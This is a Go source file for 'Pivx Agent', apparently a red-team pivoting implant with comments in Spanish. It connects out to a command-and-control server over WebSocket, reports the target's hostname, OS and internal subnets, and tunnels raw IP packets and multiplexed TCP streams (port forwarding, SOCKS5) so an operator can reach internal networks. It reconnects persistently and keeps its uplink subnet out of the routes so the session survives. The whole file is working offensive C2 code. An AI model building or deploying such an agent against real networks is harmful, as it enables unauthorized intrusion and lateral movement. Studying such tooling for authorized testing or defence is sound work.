// Pivx Agent (Fase 2)
//
// Plano de control (WebSocket, frames de TEXTO/JSON): registro, ping/pong.
// Plano de datos  (WebSocket, frames BINARIOS): paquetes IP crudos que se
// inyectan en el netstack userland (ver netstack.go).
//
// El agente inicia una conexion saliente hacia el C2 y la mantiene; sobre esa
// unica conexion se multiplexan control y datos usando el tipo de frame WS.
package main

import (
	"encoding/json"
	"flag"
	"log"
	"net"
	"os"
	"runtime"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

// MessageType define el tipo de mensaje del plano de control.
type MessageType string

const (
	MsgRegister MessageType = "register"
	MsgPing     MessageType = "ping"
	MsgPong     MessageType = "pong"
	MsgAck      MessageType = "ack"
)

// ControlMessage es el sobre comun del plano de control (frames de texto).
type ControlMessage struct {
	Type    MessageType     `json:"type"`
	AgentID string          `json:"agent_id"`
	Payload json.RawMessage `json:"payload,omitempty"`
}

// IfaceInfo describe una interfaz de red del target (para sugerir rutas).
type IfaceInfo struct {
	Name  string   `json:"name"`
	CIDRs []string `json:"cidrs"`
}

// RegisterPayload son los metadatos que el agente reporta al registrarse.
type RegisterPayload struct {
	Hostname   string      `json:"hostname"`
	OS         string      `json:"os"`
	Arch       string      `json:"arch"`
	Version    string      `json:"version"`
	Interfaces []IfaceInfo `json:"interfaces"`
}

const agentVersion = "0.2.0-datap"

// outFrame es una unidad de escritura hacia el WebSocket.
type outFrame struct {
	binary bool
	data   []byte
}

func main() {
	serverURL := flag.String("server", "ws://127.0.0.1:8765", "URL del servidor Pivx")
	pingInterval := flag.Duration("ping", 15*time.Second, "Intervalo de keep-alive")
	flag.Parse()

	agentID := uuid.NewString()
	hostname, _ := os.Hostname()

	log.Printf("[Pivx Agent %s] ID=%s destino=%s", agentVersion, agentID, *serverURL)

	for {
		if err := runSession(*serverURL, agentID, hostname, *pingInterval); err != nil {
			log.Printf("[!] Sesion terminada: %v. Reintentando en 5s...", err)
			time.Sleep(5 * time.Second)
		}
	}
}

func runSession(serverURL, agentID, hostname string, pingInterval time.Duration) error {
	conn, _, err := websocket.DefaultDialer.Dial(serverURL, nil)
	if err != nil {
		return err
	}
	defer conn.Close()
	log.Printf("[+] Conectado. Iniciando plano de control y de datos...")

	// Canal de salida unico -> un solo goroutine escribe en el socket
	// (gorilla/websocket no permite escritores concurrentes).
	out := make(chan outFrame, 1024)
	writeErr := make(chan error, 1)
	go func() {
		for f := range out {
			mt := websocket.TextMessage
			if f.binary {
				mt = websocket.BinaryMessage
			}
			if err := conn.WriteMessage(mt, f.data); err != nil {
				writeErr <- err
				return
			}
		}
	}()

	// Netstack: los paquetes de salida se encolan como frames binarios.
	ns, err := NewNetStack(func(pkt []byte) {
		cp := make([]byte, len(pkt))
		copy(cp, pkt)
		select {
		case out <- outFrame{binary: true, data: cp}:
		default:
			log.Printf("[!] buffer de salida lleno, paquete descartado")
		}
	})
	if err != nil {
		return err
	}
	defer ns.Close()

	// Helper para enviar mensajes de control (JSON / texto).
	sendControl := func(msg ControlMessage) {
		data, _ := json.Marshal(msg)
		select {
		case out <- outFrame{binary: false, data: data}:
		default:
			log.Printf("[!] buffer de salida lleno, control descartado")
		}
	}

	// Mux: plano de streams TCP (port-forwarding L4 y SOCKS5) sobre el mismo WS.
	// Envia frames binarios ya serializados (con el opcode MUX) por el canal out.
	mux := NewMux(agentID, sendControl, func(frame []byte) {
		select {
		case out <- outFrame{binary: true, data: frame}:
		default:
			log.Printf("[!] buffer de salida lleno, frame MUX descartado")
		}
	})
	defer mux.Close()

	// 1) Registro con metadatos + interfaces descubiertas.
	//
	// Anti-suicidio: determinamos la IP local que esta conexion usa para
	// alcanzar el C2 y la pasamos al descubrimiento para excluir su subred.
	// Asi el operador no puede enrutar por el tunel la propia via de vuelta al
	// servidor (lo que causaria un bucle/blackhole y mataria la sesion).
	uplinkIP := localUplinkIP(conn)
	if uplinkIP != nil {
		log.Printf("[+] IP de uplink hacia el C2: %s (su subred se excluira de las rutas)", uplinkIP)
	}
	regPayload, _ := json.Marshal(RegisterPayload{
		Hostname:   hostname,
		OS:         runtime.GOOS,
		Arch:       runtime.GOARCH,
		Version:    agentVersion,
		Interfaces: discoverInterfaces(uplinkIP),
	})
	sendControl(ControlMessage{Type: MsgRegister, AgentID: agentID, Payload: regPayload})
	log.Printf("[+] Agente registrado en el C2.")

	// 2) Lector: texto -> control ; binario -> netstack.
	readErr := make(chan error, 1)
	go func() {
		for {
			mt, data, err := conn.ReadMessage()
			if err != nil {
				readErr <- err
				return
			}
			if mt == websocket.BinaryMessage {
				// Discriminacion: nibble 0x4/0x6 = paquete IP (tunel L3);
				// cualquier otro (0x01) = frame del plano MUX de streams.
				if len(data) > 0 && (data[0]>>4 == 4 || data[0]>>4 == 6) {
					ns.InjectInbound(data)
				} else if IsMuxFrame(data) {
					mux.OnBinary(data)
				}
				continue
			}
			var msg ControlMessage
			if err := json.Unmarshal(data, &msg); err != nil {
				continue
			}
			// Plano de control entrante: primero el mux (stream_*/rforward_*);
			// lo que no consuma se procesa aqui (ack/pong u otros comandos).
			if mux.HandleControl(msg) {
				continue
			}
			_ = msg
		}
	}()

	// 3) Keep-alive.
	ticker := time.NewTicker(pingInterval)
	defer ticker.Stop()

	for {
		select {
		case err := <-readErr:
			return err
		case err := <-writeErr:
			return err
		case <-ticker.C:
			sendControl(ControlMessage{Type: MsgPing, AgentID: agentID})
		}
	}
}

// localUplinkIP devuelve la IP local que esta conexion WebSocket usa como
// origen para llegar al C2. Es la que hay que proteger: enrutar su subred por
// el tunel cerraria la via de vuelta al servidor.
func localUplinkIP(conn *websocket.Conn) net.IP {
	la := conn.LocalAddr()
	if la == nil {
		return nil
	}
	host, _, err := net.SplitHostPort(la.String())
	if err != nil {
		host = la.String()
	}
	return net.ParseIP(host)
}

// discoverInterfaces enumera las subredes conectadas del target (no loopback),
// para que el servidor pueda sugerir rutas automaticamente.
//
// uplinkIP (si no es nil) es la IP con la que el agente habla con el C2: se
// omite la CIDR que la contiene para no ofrecer una ruta que provocaria un
// bucle de enrutamiento hacia el propio servidor (blackhole de la sesion).
func discoverInterfaces(uplinkIP net.IP) []IfaceInfo {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil
	}
	var out []IfaceInfo
	for _, i := range ifaces {
		if i.Flags&net.FlagLoopback != 0 || i.Flags&net.FlagUp == 0 {
			continue
		}
		addrs, err := i.Addrs()
		if err != nil {
			continue
		}
		var cidrs []string
		for _, a := range addrs {
			ipnet, ok := a.(*net.IPNet)
			if !ok || ipnet.IP.To4() == nil {
				continue
			}
			// Anti-suicidio: descartar la subred que transporta el uplink al C2.
			if uplinkIP != nil && ipnet.Contains(uplinkIP) {
				log.Printf("[i] Subred %s omitida: contiene el uplink al C2 (%s)", ipnet.String(), uplinkIP)
				continue
			}
			cidrs = append(cidrs, ipnet.String())
		}
		if len(cidrs) > 0 {
			out = append(out, IfaceInfo{Name: i.Name, CIDRs: cidrs})
		}
	}
	return out
}
